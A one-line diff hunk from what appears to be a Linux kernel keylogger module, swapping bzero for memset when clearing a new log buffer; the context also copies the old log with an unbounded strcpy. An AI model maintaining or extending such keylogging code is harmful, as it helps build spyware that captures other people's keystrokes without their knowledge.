@@ -46,7 +46,7 @@ static int add_new_entry(char *entry)
 		printk(KERN_ERR "Failed to allocate memory for new log entry\n");
 		return (1);
 	}
-	bzero(tmp_buff, alloc_size);
+	memset(tmp_buff, 0, alloc_size);
 	if (keylogger_data.log_buffer)
 	{
 		strcpy(tmp_buff, keylogger_data.log_buffer);
